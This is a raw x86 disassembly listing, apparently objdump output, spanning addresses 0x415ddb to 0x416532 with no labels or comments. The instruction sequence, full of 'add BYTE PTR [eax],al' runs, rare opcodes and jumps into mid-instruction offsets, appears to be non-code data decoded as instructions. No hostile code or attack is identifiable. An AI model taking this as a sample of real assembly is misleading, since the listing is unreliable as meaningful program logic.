  415ddb:	inc    ebx
  415ddc:	adc    BYTE PTR [eax],al
  415dde:	and    BYTE PTR [eax],0x20
  415de1:	add    al,0x82
  415de3:	inc    eax
  415de4:	and    cl,BYTE PTR [eax]
  415de6:	add    al,cl
  415de8:	and    BYTE PTR [eax],ah
  415dea:	inc    ecx
  415deb:	push   es
  415dec:	adc    BYTE PTR [eax+0x40b0200],al
  415df2:	add    BYTE PTR [ecx+0x0],al
  415df5:	add    BYTE PTR [edx+0xc20006],al
  415dfb:	inc    ecx
  415dfc:	dec    eax
  415dfd:	bound  eax,QWORD PTR [eax]
  415dff:	inc    ecx
  415e00:	add    BYTE PTR [edx+0x20d4],0x60
  415e07:	or     BYTE PTR [ecx],bh
  415e09:	push   0x0
  415e0b:	adc    BYTE PTR [edx],al
  415e0d:	dec    esp
  415e0e:	add    BYTE PTR [edx],dh
  415e10:	cdq    
  415e11:	add    BYTE PTR [ecx],al
  415e13:	add    al,BYTE PTR [eax+0x411068]
  415e19:	adc    BYTE PTR [eax],al
  415e1b:	add    BYTE PTR [ecx+eax*4],al
  415e1e:	and    BYTE PTR [eax],al
  415e20:	rol    BYTE PTR [ecx],0x88
  415e23:	add    BYTE PTR [eax+eax*1],al
  415e26:	mov    eax,0x900021
  415e2b:	add    BYTE PTR [eax],dl
  415e2d:	dec    eax
  415e2e:	test   DWORD PTR [ebx+esi*1],ecx
  415e31:	in     eax,0x40
  415e33:	add    DWORD PTR [ebx+0x10157561],esp
  415e39:	or     DWORD PTR [eax-0x60],edx
  415e3c:	sub    BYTE PTR [edx],al
  415e3e:	inc    eax
  415e3f:	mov    eax,ds:0x41000690
  415e44:	sbb    DWORD PTR [edx],edx
  415e46:	rol    DWORD PTR [eax+0x40],0x88
  415e4a:	inc    ecx
  415e4b:	mov    al,ds:0x11004278
  415e50:	inc    eax
  415e51:	or     BYTE PTR [ecx+0x20000000],ah
  415e57:	dec    eax
  415e58:	fmul   DWORD PTR [eax]
  415e5a:	mov    eax,es:0x694108
  415e60:	test   al,0x49
  415e62:	add    BYTE PTR [eax],cl
  415e64:	add    DWORD PTR [ebx],ebx
  415e66:	add    al,BYTE PTR [edx-0x80]
  415e69:	and    DWORD PTR [ecx+0x28],eax
  415e6c:	nop
  415e6d:	add    DWORD PTR [esp+edx*1],eax
  415e70:	add    BYTE PTR [ecx],ah
  415e72:	inc    eax
  415e73:	add    eax,0x20c23e40
  415e78:	inc    ecx
  415e79:	mov    eax,DWORD PTR [eax+0x50]
  415e7c:	or     BYTE PTR [edi+0x5],al
  415e7f:	inc    ecx
  415e80:	add    BYTE PTR [eax],0x40
  415e83:	adc    eax,eax
  415e85:	add    DWORD PTR [eax+edx*1+0x8],edx
  415e89:	add    DWORD PTR [eax],eax
  415e8b:	add    BYTE PTR [eax],ch
  415e8d:	sbb    BYTE PTR [eax],0x40
  415e90:	mov    WORD PTR [eax+eax*1],es
  415e93:	add    BYTE PTR [ebp-0x1f],ah
  415e96:	inc    eax
  415e97:	inc    edx
  415e98:	add    BYTE PTR [esp+eax*1],al
  415e9b:	mov    dl,0x4
  415e9d:	add    BYTE PTR [esi+0x4000153],cl
  415ea3:	and    BYTE PTR [eax],al
  415ea5:	inc    eax
  415ea6:	inc    ecx
  415ea7:	or     BYTE PTR [edx],al
  415ea9:	or     BYTE PTR [ecx+edx*8],0x20
  415ead:	adc    eax,DWORD PTR [edx]
  415eaf:	and    BYTE PTR [eax+0x0],al
  415eb2:	pusha  
  415eb3:	add    DWORD PTR [edx],esp
  415eb5:	adc    BYTE PTR [esi+0x8aa2800],ah
  415ebb:	or     BYTE PTR [ecx+eax*2],0x88
  415ebf:	or     eax,DWORD PTR [eax]
  415ec1:	add    al,BYTE PTR [eax]
  415ec3:	adc    BYTE PTR [edx],al
  415ec5:	adc    DWORD PTR [eax],eax
  415ec7:	push   ds
  415ec8:	or     BYTE PTR [eax-0x39f9b6ee],ah
  415ece:	add    BYTE PTR [eax+0x140084],al
  415ed4:	xor    ah,BYTE PTR [eax+eax*8+0x40]
  415ed8:	add    al,0x60
  415eda:	dec    esp
  415edb:	and    BYTE PTR [edx+edx*4+0x5c618100],0x28
  415ee3:	add    al,ah
  415ee5:	adc    BYTE PTR [eax],bl
  415ee7:	add    BYTE PTR [eax],al
  415ee9:	cwde   
  415eea:	inc    ecx
  415eeb:	pusha  
  415eec:	mov    ah,BYTE PTR [eax+eax*1]
  415eef:	or     BYTE PTR [ebx],ah
  415ef1:	push   eax
  415ef2:	adc    BYTE PTR [ecx+0x52],cl
  415ef5:	or     BYTE PTR [eax],cl
  415ef7:	mov    DWORD PTR [eax],eax
  415ef9:	dec    eax
  415efa:	mov    BYTE PTR [ecx],al
  415efc:	add    eax,0x802000d9
  415f01:	mov    BYTE PTR [eax],al
  415f03:	and    DWORD PTR [ecx+0x8066090],eax
  415f09:	add    BYTE PTR [eax],ah
  415f0b:	adc    eax,eax
  415f0d:	add    DWORD PTR [esi],eax
  415f0f:	add    eax,0x41104120
  415f14:	or     al,BYTE PTR [eax]
  415f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f17:	add    al,BYTE PTR [edx+eax*1]
  415f1a:	adc    BYTE PTR [eax],al
  415f1c:	mov    esp,0x7109085
  415f21:	add    BYTE PTR [eax+0x900],ch
  415f27:	mov    dl,BYTE PTR [eax]
  415f29:	or     al,BYTE PTR [ecx*1+0x20140040]
  415f30:	or     BYTE PTR [ebx],al
  415f32:	adc    BYTE PTR [eax],dl
  415f34:	add    BYTE PTR [eax],cl
  415f36:	add    BYTE PTR [eax],0x41
  415f39:	and    BYTE PTR [eax],ah
  415f3b:	add    BYTE PTR [eax],al
  415f3d:	add    BYTE PTR [ecx+0x842a2],al
  415f43:	inc    ecx
  415f44:	add    al,BYTE PTR [edx]
  415f46:	icebp  
  415f47:	adc    al,0x8
  415f49:	pop    ss
  415f4a:	inc    esp
  415f4b:	add    eax,0xa040804
  415f50:	sub    BYTE PTR [eax-0x5b],al
  415f53:	and    DWORD PTR [edx+eax*1],eax
  415f56:	add    BYTE PTR [ecx],cl
  415f58:	add    al,0xa4
  415f5a:	adc    BYTE PTR [eax],cl
  415f5c:	or     BYTE PTR [eax],al
  415f5e:	add    BYTE PTR [edx],bl
  415f60:	add    al,0x19
  415f62:	add    al,0x0
  415f64:	inc    ecx
  415f65:	add    cl,BYTE PTR [edx]
  415f67:	xor    BYTE PTR [edx],dl
  415f69:	adc    BYTE PTR [ecx+0x64],al
  415f6c:	add    DWORD PTR [eax],eax
  415f6e:	adc    BYTE PTR [ebx+0x68200101],0x0
  415f75:	add    BYTE PTR [eax],al
  415f77:	add    BYTE PTR gs:[eax],al
  415f7a:	add    BYTE PTR [edx],ah
  415f7c:	leave  
  415f7d:	adc    BYTE PTR [eax],al
  415f7f:	mov    ds:0x40400900,al
  415f84:	push   es
  415f85:	inc    eax
  415f86:	and    dl,BYTE PTR [eax]
  415f88:	add    BYTE PTR [eax+eiz*1],dl
  415f8b:	add    BYTE PTR [ebx+0x3],ah
  415f8e:	inc    eax
  415f8f:	and    BYTE PTR [eax+edx*1+0x1d02004],al
  415f96:	add    BYTE PTR [ebx+0x20],ah
  415f99:	sub    BYTE PTR [edx],al
  415f9b:	inc    edx
  415f9c:	adc    dl,al
  415f9e:	add    DWORD PTR [ecx+0x40],ebp
  415fa1:	inc    esp
  415fa2:	adc    al,0x5
  415fa4:	or     BYTE PTR [ecx],0x20
  415fa7:	add    DWORD PTR [eax],ecx
  415fa9:	push   eax
  415faa:	add    DWORD PTR [eax],eax
  415fac:	loopne 0x415fee
  415fae:	rol    DWORD PTR ds:0x8e004002,1
  415fb4:	add    BYTE PTR [esp+edx*2],bl
  415fb7:	add    BYTE PTR [eax+0x828048],al
  415fbd:	add    cl,0x9
  415fc0:	inc    eax
  415fc1:	add    al,BYTE PTR [eax]
  415fc3:	add    BYTE PTR [eax],ah
  415fc5:	add    BYTE PTR [edx],al
  415fc7:	dec    eax
  415fc8:	sub    BYTE PTR [esi+0x204041],ah
  415fce:	add    BYTE PTR [eax+0x24],al
  415fd1:	add    BYTE PTR [esp+ecx*8],al
  415fd4:	add    al,0x92
  415fd6:	sbb    al,dh
  415fd8:	sub    BYTE PTR [edx+0x810000],al
  415fde:	inc    eax
  415fdf:	add    ecx,DWORD PTR [eax]
  415fe1:	add    BYTE PTR [eax+0xe],0x60
  415fe5:	add    ch,ah
  415fe7:	add    BYTE PTR [edx+0x21],0x47
  415feb:	add    BYTE PTR [ebx],al
  415fed:	add    al,al
  415fef:	jo     0x41603d
  415ff1:	add    BYTE PTR [edx+eax*2],dh
  415ff4:	add    BYTE PTR [eax+0x1110081],ch
  415ffa:	xchg   BYTE PTR [eax],al
  415ffc:	int    0x40
  415ffe:	add    dl,BYTE PTR [eax]
  416000:	or     BYTE PTR [eax],0x0
  416003:	add    BYTE PTR [eax],0x8
  416006:	adc    DWORD PTR [ecx],eax
  416008:	and    BYTE PTR [eax+0x7002158],0x95
  41600f:	add    cl,BYTE PTR [esi]
  416011:	or     BYTE PTR [ecx],al
  416013:	or     dl,BYTE PTR [ecx+eax*1]
  416016:	dec    eax
  416017:	add    BYTE PTR [eax+0x4141],dl
  41601d:	sbb    DWORD PTR [eax],eax
  41601f:	xchg   ecx,eax
  416020:	mov    ds:0x10010400,al
  416025:	add    BYTE PTR [eax],al
  416027:	inc    edx
  416028:	or     cl,BYTE PTR [eax]
  41602a:	dec    ebp
  41602b:	inc    edx
  41602c:	add    cl,BYTE PTR [eax]
  41602e:	adc    BYTE PTR [edx-0x80],dl
  416031:	add    DWORD PTR [ecx+0x20],edx
  416034:	add    BYTE PTR [ecx],al
  416036:	inc    esp
  416037:	add    BYTE PTR [edx+0x72],dl
  41603a:	or     BYTE PTR [eax],al
  41603c:	inc    edx
  41603d:	add    BYTE PTR [eax],al
  41603f:	add    al,0x9c
  416041:	add    al,BYTE PTR [eax]
  416043:	push   ecx
  416044:	add    edx,DWORD PTR [eax-0x80]
  416047:	add    BYTE PTR [eax],al
  416049:	nop
  41604a:	add    BYTE PTR [eax-0x6f3d3f00],al
  416050:	add    DWORD PTR [edx],edx
  416052:	and    BYTE PTR [edx],al
  416054:	add    BYTE PTR [eax],cl
  416056:	xor    DWORD PTR [ecx+edx*4],esp
  416059:	add    BYTE PTR [eax-0x7fbdf800],bl
  41605f:	les    edi,FWORD PTR [eax+eax*2-0x77ffd397]
  416066:	add    al,bl
  416068:	nop
  416069:	and    BYTE PTR [eax],al
  41606b:	add    BYTE PTR [eax],al
  41606d:	inc    eax
  41606e:	add    DWORD PTR [edi+eax*1],eax
  416071:	push   ss
  416072:	adc    dl,BYTE PTR [eax]
  416074:	add    DWORD PTR [eax*2+0x110010],eax
  41607b:	int    0x3
  41607d:	cmp    BYTE PTR [eax],al
  41607f:	inc    eax
  416080:	push   eax
  416081:	and    BYTE PTR [edx+eax*2],al
  416084:	adc    BYTE PTR [eax],al
  416086:	adc    ah,BYTE PTR [edi+0x640060]
  41608c:	popa   
  41608d:	add    BYTE PTR [ecx],ah
  41608f:	add    BYTE PTR [eax],cl
  416091:	add    BYTE PTR [ecx],ah
  416093:	add    BYTE PTR [eax],al
  416095:	add    al,BYTE PTR [eax]
  416097:	add    DWORD PTR [eax],esi
  416099:	adc    BYTE PTR [eax],cl
  41609b:	add    BYTE PTR [eax+0x0],al
  41609e:	and    al,0x81
  4160a0:	daa    
  4160a1:	pusha  
  4160a2:	or     BYTE PTR [eax+0x0],al
  4160a5:	xchg   BYTE PTR [ecx],ah
  4160a7:	add    eax,DWORD PTR [ecx]
  4160a9:	add    al,BYTE PTR [eax]
  4160ab:	rol    BYTE PTR [ecx+0x17],0x29
  4160af:	add    cl,al
  4160b1:	add    al,0x4
  4160b3:	add    BYTE PTR [eax],bh
  4160b5:	add    cl,al
  4160b7:	mov    eax,ds:0x88420040
  4160bc:	add    DWORD PTR [eax],esp
  4160be:	add    eax,0x80408011
  4160c3:	push   eax
  4160c4:	add    al,0x24
  4160c6:	dec    ecx
  4160c7:	loopne 0x4160c9
  4160c9:	add    BYTE PTR [edx],0x44
  4160cc:	inc    eax
  4160cd:	add    BYTE PTR [eax],al
  4160cf:	or     BYTE PTR [eax],al
  4160d1:	mov    al,ds:0x8000941
  4160d6:	add    BYTE PTR [eax+0x40],ah
  4160d9:	and    BYTE PTR [ecx],al
  4160db:	adc    BYTE PTR [eax+0x11],al
  4160de:	inc    eax
  4160df:	dec    ecx
  4160e0:	add    BYTE PTR [eax],0x5
  4160e3:	les    ebp,FWORD PTR [eax]
  4160e5:	adc    BYTE PTR [eax+eax*1],al
  4160e8:	push   edx
  4160e9:	push   esi
  4160ea:	add    dh,BYTE PTR [eax]
  4160ec:	add    cl,al
  4160ee:	xor    bl,BYTE PTR ds:0x8a002
  4160f4:	bound  esp,QWORD PTR [eax+0x19410040]
  4160fa:	inc    eax
  4160fb:	inc    eax
  4160fc:	add    BYTE PTR [ecx-0x4f],0x80
  416100:	inc    eax
  416101:	add    BYTE PTR [eax],al
  416103:	xchg   esi,eax
  416104:	add    al,BYTE PTR [eax+0x2007140]
  41610a:	pusha  
  41610b:	mov    al,ds:0x1080
  416110:	or     cl,BYTE PTR [eax]
  416112:	add    BYTE PTR [esi],al
  416114:	adc    al,ah
  416116:	and    al,BYTE PTR [edx]
  416118:	and    DWORD PTR [eax+0x406074],ecx
  41611e:	add    al,0x9c
  416120:	or     eax,0x80204b00
  416125:	inc    ecx
  416126:	inc    esi
  416127:	add    BYTE PTR [eax+0x1],cl
  41612a:	dec    esp
  41612b:	test   BYTE PTR [eax],bl
  41612d:	add    BYTE PTR [eax],al
  41612f:	add    eax,0x41000000
  416134:	push   eax
  416135:	add    cl,BYTE PTR [eax]
  416137:	add    BYTE PTR [eax],dl
  416139:	and    ah,BYTE PTR [edx]
  41613b:	and    BYTE PTR [eax+0x0],al
  41613e:	mov    esp,0xc11786
  416143:	inc    ecx
  416144:	push   eax
  416145:	and    DWORD PTR [edx],eax
  416147:	or     BYTE PTR [edx],ah
  416149:	add    BYTE PTR [eax+0x40204140],al
  41614f:	sbb    DWORD PTR [eax],eax
  416151:	dec    edx
  416152:	add    BYTE PTR [edx],cl
  416154:	enter  0x20e,0x0
  416158:	add    BYTE PTR [eax],dh
  41615a:	and    BYTE PTR [edx],cl
  41615c:	adc    dl,BYTE PTR [edx]
  41615e:	add    al,BYTE PTR [ebp+0x208a0808]
  416164:	inc    eax
  416165:	add    cl,al
  416167:	add    BYTE PTR [ecx],al
  416169:	add    BYTE PTR [edx],al
  41616b:	inc    eax
  41616c:	add    al,BYTE PTR [edx]
  41616e:	add    BYTE PTR [edx],cl
  416170:	nop
  416171:	add    eax,DWORD PTR [ecx+0x4cee42]
  416177:	test   BYTE PTR [eax+0x0],dl
  41617a:	inc    edx
  41617b:	dec    edx
  41617c:	push   ecx
  41617d:	add    cl,BYTE PTR [edx]
  41617f:	add    BYTE PTR [eax+0xc3a0260],al
  416185:	add    BYTE PTR [eax+0x62a2],al
  41618b:	cwde   
  41618c:	add    BYTE PTR [eax],ah
  41618e:	aam    0x46
  416190:	add    al,0x8
  416192:	int3   
  416193:	adc    BYTE PTR [eax],al
  416195:	add    BYTE PTR [eax],al
  416197:	add    BYTE PTR ds:0x24a23200,al
  41619d:	dec    ebx
  41619e:	or     DWORD PTR [edx],edx
  4161a0:	and    al,0x0
  4161a2:	sbb    BYTE PTR [eax],al
  4161a4:	or     BYTE PTR [eax],al
  4161a6:	or     BYTE PTR [eax],al
  4161a8:	dec    edx
  4161a9:	inc    edx
  4161aa:	add    BYTE PTR [edx],cl
  4161ac:	add    al,0xb6
  4161ae:	inc    eax
  4161af:	add    BYTE PTR [eax+0x10014052],al
  4161b5:	adc    BYTE PTR [eax],0x0
  4161b8:	add    cl,BYTE PTR [ecx+0x4]
  4161bb:	add    dl,BYTE PTR [ecx]
  4161bd:	cmp    DWORD PTR [ecx-0x70],0x940
  4161c4:	add    BYTE PTR ds:0x64008300,al
  4161ca:	mov    BYTE PTR [edx],al
  4161cc:	add    BYTE PTR [edx],al
  4161ce:	mov    al,ds:0x2002c000
  4161d3:	out    0x0,eax
  4161d5:	inc    eax
  4161d6:	add    BYTE PTR [eax],dl
  4161d8:	add    BYTE PTR [eax+0x20222000],al
  4161de:	and    eax,DWORD PTR [esp+ecx*1]
  4161e1:	inc    eax
  4161e2:	pusha  
  4161e3:	add    BYTE PTR [edx],ch
  4161e5:	adc    al,dl
  4161e7:	adc    BYTE PTR [eax],ah
  4161e9:	sub    BYTE PTR [edx],dl
  4161eb:	mov    ds:0x20080000,eax
  4161f0:	add    BYTE PTR [eax],ah
  4161f2:	inc    eax
  4161f3:	inc    ecx
  4161f4:	adc    BYTE PTR [ebp+0x22110],0x2
  4161fb:	add    al,0x0
  4161fd:	nop
  4161fe:	push   ss
  4161ff:	add    BYTE PTR [eax-0x80],ah
  416202:	add    BYTE PTR [eax],al
  416204:	inc    ebp
  416205:	cdq    
  416206:	inc    ecx
  416207:	add    eax,DWORD PTR [ecx]
  416209:	adc    BYTE PTR [eax+0x180cdf0c],0x2
  416210:	mov    DWORD PTR [eax],eax
  416212:	jo     0x41622b
  416214:	add    al,0xf1
  416216:	adc    BYTE PTR ds:0x4080,al
  41621c:	add    BYTE PTR [eax+ecx*2],dl
  41621f:	mov    BYTE PTR [ecx],al
  416221:	inc    ecx
  416222:	and    al,BYTE PTR [edx]
  416224:	shr    BYTE PTR [eax+0x44a4051],0x40
  41622b:	mov    al,ds:0x4588e6c0
  416230:	pusha  
  416231:	push   ecx
  416232:	add    BYTE PTR [eax],cl
  416234:	and    al,BYTE PTR [eax+0x20504224]
  41623a:	push   eax
  41623b:	mov    ecx,DWORD PTR [eax+eax*1]
  41623e:	add    BYTE PTR ds:0x80441101,al
  416244:	loope  0x4161ca
  416246:	add    al,BYTE PTR [eax+0x0]
  416249:	pop    ebp
  41624a:	add    DWORD PTR [ecx],edx
  41624c:	test   BYTE PTR [ecx-0x80],al
  41624f:	add    DWORD PTR [edx],eax
  416251:	mov    al,al
  416253:	es jmp 0x416256
  416256:	or     BYTE PTR [edi+0x5014050],bh
  41625c:	pusha  
  41625d:	inc    ebx
  41625e:	dec    ecx
  41625f:	adc    BYTE PTR [ecx+0x255b00c],0x3a
  416266:	or     BYTE PTR [eax-0x7bfbf7fc],al
  41626c:	xor    BYTE PTR [eax],ah
  41626e:	add    BYTE PTR [eax-0x6c],al
  416271:	xor    BYTE PTR [ecx],cl
  416273:	push   eax
  416274:	inc    eax
  416275:	adc    BYTE PTR [eax],al
  416277:	add    BYTE PTR [eax],cl
  416279:	and    edx,ecx
  41627b:	add    DWORD PTR [edx],0x8006100
  416281:	xchg   ecx,eax
  416282:	or     eax,0x97090062
  416287:	or     al,al
  416289:	add    BYTE PTR [ebx],ch
  41628b:	add    BYTE PTR [eax+0x2602d206],bh
  416291:	sbb    DWORD PTR [ecx],eax
  416293:	pop    eax
  416294:	add    DWORD PTR [eax+0x4002e548],eax
  41629a:	add    dl,BYTE PTR [edx+eax*2+0x0]
  41629e:	inc    edx
  41629f:	add    DWORD PTR [eax],esp
  4162a1:	sub    al,0x11
  4162a3:	add    al,0x84
  4162a5:	add    al,0x1
  4162a7:	or     BYTE PTR [eax],al
  4162a9:	and    BYTE PTR [ecx],0x91
  4162ac:	cmp    al,0x20
  4162ae:	adc    DWORD PTR [edx+ebx*2],edx
  4162b1:	lods   eax,DWORD PTR ds:[esi]
  4162b2:	add    DWORD PTR [ebp+eax*2+0x41],0xe8a008
  4162ba:	dec    ecx
  4162bb:	adc    eax,0x52220
  4162c0:	mov    ah,0x3a
  4162c2:	les    esp,FWORD PTR [eax]
  4162c4:	add    BYTE PTR [eax+eax*1],al
  4162c7:	add    BYTE PTR [ecx],dl
  4162c9:	add    al,0x82
  4162cb:	and    al,0x61
  4162cd:	add    al,BYTE PTR [eax]
  4162cf:	xor    eax,DWORD PTR [ecx+0x45]
  4162d2:	adc    BYTE PTR [eax],al
  4162d4:	adc    BYTE PTR [ebx],dl
  4162d6:	dec    esp
  4162d7:	add    al,0x20
  4162d9:	or     DWORD PTR [esp+eax*1],eax
  4162dc:	add    BYTE PTR [esi],al
  4162de:	add    BYTE PTR [eax+0x2100023],al
  4162e4:	add    ah,BYTE PTR [eax]
  4162e6:	push   eax
  4162e7:	adc    al,BYTE PTR [eax]
  4162e9:	inc    ecx
  4162ea:	inc    eax
  4162eb:	add    al,BYTE PTR ds:0x400091a1
  4162f1:	mov    al,0x0
  4162f3:	add    BYTE PTR [ebx],al
  4162f5:	imul   eax,DWORD PTR [eax+0x1c184],0xc4010003
  4162ff:	add    cl,bh
  416301:	adc    BYTE PTR [ebp+0x43],dl
  416304:	inc    eax
  416305:	and    BYTE PTR [eax],al
  416307:	or     DWORD PTR [ecx+0xc],eax
  41630a:	add    BYTE PTR [edx],cl
  41630c:	and    esp,DWORD PTR [ecx]
  41630e:	add    al,BYTE PTR [eax]
  416310:	sub    al,BYTE PTR [eax]
  416312:	inc    eax
  416313:	add    edx,eax
  416315:	imul   ebx,DWORD PTR [ecx+0x44020000],0x10
  41631c:	add    BYTE PTR [eax],ah
  41631e:	add    eax,DWORD PTR [eax]
  416320:	and    al,0x9
  416322:	and    al,BYTE PTR ds:0x4000aed0
  416328:	or     BYTE PTR [eax+eax*4+0x100d880],al
  41632f:	inc    esp
  416330:	inc    esp
  416331:	add    BYTE PTR [edx],cl
  416333:	add    cl,BYTE PTR [eax]
  416335:	add    BYTE PTR [eax],ah
  416337:	add    BYTE PTR [eax+0x4],ah
  41633a:	adc    DWORD PTR [eax],eax
  41633c:	or     al,BYTE PTR [eax]
  41633e:	inc    edx
  41633f:	rol    BYTE PTR [ecx+eax*2],cl
  416342:	add    BYTE PTR [edx+0x28],bl
  416345:	mov    al,ds:0xe00900
  41634a:	leave  
  41634b:	add    al,0x80
  41634d:	add    BYTE PTR [eax],dh
  41634f:	add    BYTE PTR [eax],al
  416351:	adc    al,BYTE PTR [eax]
  416353:	retf   
  416354:	mov    eax,0x604a0916
  416359:	add    BYTE PTR [edx-0x7def7600],ch
  41635f:	sub    al,0x88
  416361:	cmp    BYTE PTR [eax],al
  416363:	adc    DWORD PTR [edx],edx
  416365:	sub    BYTE PTR [eax],al
  416367:	test   BYTE PTR [ecx],al
  416369:	sub    BYTE PTR [eax+0x40],0x42
  41636d:	add    BYTE PTR [eax],al
  41636f:	and    BYTE PTR [ecx],bl
  416371:	and    al,BYTE PTR [eax]
  416373:	add    BYTE PTR [eax+eax*1+0x4410200],ch
  41637a:	add    BYTE PTR [eax+eax*1],al
  41637d:	adc    BYTE PTR [ecx],al
  41637f:	or     BYTE PTR [eax],al
  416381:	add    al,0x0
  416383:	or     BYTE PTR [ecx+0x40],al
  416386:	add    BYTE PTR [edx],al
  416388:	nop
  416389:	add    BYTE PTR [eax],0x1c
  41638c:	add    BYTE PTR [ecx+0x0],al
  41638f:	adc    BYTE PTR [eax-0x3abfbfb8],al
  416395:	rol    DWORD PTR [eax],0x2
  416398:	add    al,0x20
  41639a:	and    BYTE PTR [ecx],dh
  41639c:	inc    eax
  41639d:	and    BYTE PTR [ecx],bl
  41639f:	or     DWORD PTR [eax],0x840080
  4163a5:	inc    ecx
  4163a6:	and    al,0x41
  4163a8:	add    BYTE PTR [eax],al
  4163aa:	push   es
  4163ab:	add    BYTE PTR [edi],dl
  4163ad:	sub    DWORD PTR [eax+ecx*2+0x81],ecx
  4163b4:	or     BYTE PTR [eax],0x40
  4163b7:	add    eax,0xb8000340
  4163bc:	add    BYTE PTR cs:[eax+0x4],0x0
  4163c1:	ret    
  4163c2:	push   esp
  4163c3:	add    al,BYTE PTR [ecx]
  4163c5:	adc    eax,0x18042000
  4163ca:	add    DWORD PTR [eax-0x70],eax
  4163cd:	add    cl,dl
  4163cf:	loop   0x4163f1
  4163d1:	inc    eax
  4163d2:	add    cl,BYTE PTR [ecx+0x40]
  4163d5:	push   edx
  4163d6:	adc    BYTE PTR [eax],0x0
  4163d9:	add    al,0x0
  4163db:	sbb    BYTE PTR [eax+0x15],cl
  4163de:	adc    DWORD PTR [edi-0x7f],eax
  4163e1:	sbb    al,BYTE PTR [eax]
  4163e3:	adc    BYTE PTR [eax],al
  4163e5:	inc    ecx
  4163e6:	add    al,BYTE PTR [eax]
  4163e8:	or     al,0x7
  4163ea:	and    bl,BYTE PTR [ebx]
  4163ec:	add    al,0x23
  4163ee:	mov    WORD PTR [edx*1+0xa62c175],fs
  4163f5:	add    BYTE PTR [ecx],al
  4163f7:	xchg   esp,eax
  4163f8:	inc    edx
  4163f9:	push   ecx
  4163fa:	and    al,al
  4163fc:	and    BYTE PTR [edx],al
  4163fe:	ret    0xe4
  416401:	adc    BYTE PTR [eax+eax*1],cl
  416404:	or     BYTE PTR [edx+0x843102c],bl
  41640a:	push   ecx
  41640b:	add    BYTE PTR [ecx],cl
  41640d:	add    esp,DWORD PTR [eax]
  41640f:	inc    eax
  416410:	push   es
  416411:	adc    eax,DWORD PTR [eax]
  416413:	or     BYTE PTR [edx+eax*1],al
  416416:	add    BYTE PTR [eax],0x80
  416419:	add    BYTE PTR [eax],al
  41641b:	and    BYTE PTR [eax],0x0
  41641e:	or     al,0x1
  416420:	add    BYTE PTR [ecx+0x0],ah
  416423:	add    BYTE PTR [eax+0x0],bl
  416426:	dec    ecx
  416427:	add    BYTE PTR [eax],al
  416429:	jo     0x41643f
  41642b:	add    BYTE PTR [edx],al
  41642d:	and    cl,bh
  41642f:	inc    esp
  416430:	add    BYTE PTR [edx-0x76],dl
  416433:	add    al,0x93
  416435:	add    BYTE PTR [ecx],al
  416437:	add    BYTE PTR [eax+0x0],ah
  41643a:	adc    BYTE PTR ds:0x4000000,ah
  416440:	or     BYTE PTR [ebx],cl
  416442:	and    BYTE PTR [edx+edx*1+0x20],al
  416446:	inc    edx
  416447:	add    al,BYTE PTR [edx]
  416449:	add    BYTE PTR [eax],al
  41644b:	test   al,0x0
  41644d:	add    al,0x0
  41644f:	add    eax,DWORD PTR es:[eax]
  416452:	xchg   DWORD PTR [edx],eax
  416454:	and    DWORD PTR ds:0x1d000020,0xf2590000
  41645e:	inc    ecx
  41645f:	or     BYTE PTR [ecx+0x1],al
  416462:	add    BYTE PTR [eax],al
  416464:	mov    al,BYTE PTR [edx+ecx*1]
  416467:	enter  0x4101,0x41
  41646b:	adc    BYTE PTR [edx],al
  41646d:	xor    BYTE PTR [eax+0x9],cl
  416470:	add    eax,DWORD PTR [edx-0x78]
  416473:	je     0x416475
  416475:	rol    BYTE PTR [ecx],1
  416477:	add    BYTE PTR [eax+0x4],ah
  41647a:	add    BYTE PTR [eax],al
  41647c:	cmc    
  41647d:	loop   0x41648f
  41647f:	add    BYTE PTR [eax],al
  416481:	add    BYTE PTR [eax],al
  416483:	inc    eax
  416484:	adc    BYTE PTR [eax],al
  416486:	and    DWORD PTR [ecx],eax
  416488:	add    BYTE PTR [eax],al
  41648a:	add    DWORD PTR [ecx+eax*2],eax
  41648d:	inc    eax
  41648e:	add    BYTE PTR [ecx+0x280140],cl
  416494:	sbb    al,0xc9
  416496:	inc    ebp
  416497:	push   es
  416498:	sbb    BYTE PTR [ecx],bl
  41649a:	push   eax
  41649b:	loopne 0x4164bb
  41649d:	test   eax,eax
  41649f:	loopne 0x416422
  4164a1:	add    DWORD PTR ds:0x4840101,edx
  4164a7:	or     eax,DWORD PTR [eax]
  4164a9:	xor    al,0x84
  4164ab:	add    al,0x0
  4164ad:	sbb    al,0x12
  4164af:	push   ecx
  4164b0:	and    DWORD PTR [ecx-0x76bbfffc],0x40
  4164b7:	add    BYTE PTR [ecx+0x11848100],cl
  4164bd:	xchg   BYTE PTR [ecx+0x42008010],al
  4164c3:	adc    BYTE PTR [ecx],al
  4164c5:	inc    ebp
  4164c6:	inc    eax
  4164c7:	lods   eax,DWORD PTR ds:[esi]
  4164c8:	xor    BYTE PTR [eax],al
  4164ca:	add    DWORD PTR [eax],eax
  4164cc:	loope  0x4164f4
  4164ce:	add    al,BYTE PTR [eax]
  4164d0:	inc    eax
  4164d1:	and    al,0x0
  4164d3:	nop
  4164d4:	add    BYTE PTR [eax],ah
  4164d6:	add    al,0x40
  4164d8:	inc    eax
  4164d9:	and    DWORD PTR [eax+eax*4],edx
  4164dc:	push   eax
  4164dd:	add    BYTE PTR [ebp+0x8010000],al
  4164e3:	add    DWORD PTR [esi],edx
  4164e5:	and    BYTE PTR [eax+0x118211],al
  4164eb:	add    cl,BYTE PTR [ecx]
  4164ed:	and    al,0x10
  4164ef:	add    BYTE PTR [eax],al
  4164f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f2:	adc    al,0x8a
  4164f4:	add    BYTE PTR [eax],0x80
  4164f7:	and    BYTE PTR [eax],ah
  4164f9:	inc    eax
  4164fa:	popa   
  4164fb:	mov    ds:0x31191d,al
  416500:	push   eax
  416501:	mov    DWORD PTR [eax],ecx
  416503:	inc    ecx
  416504:	xchg   edx,eax
  416505:	and    al,BYTE PTR [ecx]
  416507:	xchg   esp,eax
  416508:	mov    al,BYTE PTR [eax+0x181038]
  41650e:	or     al,BYTE PTR [edx]
  416510:	nop
  416511:	adc    eax,0x20005080
  416516:	add    al,BYTE PTR [eax]
  416518:	popa   
  416519:	add    BYTE PTR [eax],ch
  41651b:	and    DWORD PTR [eax],ecx
  41651d:	add    BYTE PTR [eax],ah
  41651f:	mov    ebx,DWORD PTR [edx+eiz*1+0x10]
  416523:	inc    ebx
  416524:	sbb    BYTE PTR [eax],al
  416526:	add    eax,0x22001000
  41652b:	mov    al,ds:0x234d4010
  416530:	dec    ecx
  416531:	pusha  
  416532:	inc    esi
